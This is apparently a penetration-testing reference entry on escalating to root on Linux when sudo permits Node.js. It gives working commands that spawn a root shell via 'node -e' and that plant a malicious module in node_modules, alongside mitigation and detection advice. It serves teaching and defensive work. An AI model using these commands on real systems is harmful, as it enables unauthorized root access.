---
topic: Node.js — arbitrary execution with sudo
tags: [linux, nodejs, sudo, child-process, privesc]
---

# Node.js — arbitrary execution with sudo

**English** | [🌐 Español](node-sudo-privesc.md)

## Concept

A sudo rule allowing Node.js on a specific script may be insufficient if the script loads modules from a controllable path or if `-e` can be passed. Node.js is a full interpreter: `child_process` runs commands with the effective sudo UID, root.

## When it applies

- `sudo -l` shows `node` or a Node.js wrapper.
- The script imports modules from a writable directory.
- `-e`, `--eval` or unvalidated arguments are allowed.

## Procedure

1. Review the sudo rule and script.
2. Check whether `-e` or a module can be injected.
3. Run `child_process` to launch a shell.
4. Verify the UID and escalation.

## Commands

```bash
sudo -l
sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:"inherit"})'
# If only a script is allowed
ls -la /opt/app/node_modules
echo 'require("child_process").execSync("id")' > /opt/app/node_modules/local/index.js
sudo /usr/bin/node /opt/app/script.js
```

## Variants

- Poison `node_modules` or `NODE_PATH`.
- Abuse a `require` of a relative path.
- Use `--inspect` to attach a debugger.

## Limitations

- The rule may restrict arguments.
- The script may use absolute paths.
- The directory may be read-only.

## Mitigation

- Do not allow full interpreters in sudo.
- Pin arguments and absolute paths.
- Run scripts as a dedicated user.

## Detection

- `sudo node` from non-admin accounts.
- New modules in `node_modules`.
- Node.js child processes with `/bin/sh`.

## References

- [Node.js — child_process](https://nodejs.org/api/child_process.html)
- [0xdf — Stocker](https://0xdf.gitlab.io/2023/06/24/htb-stocker.html)
- [CWE-269 — Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
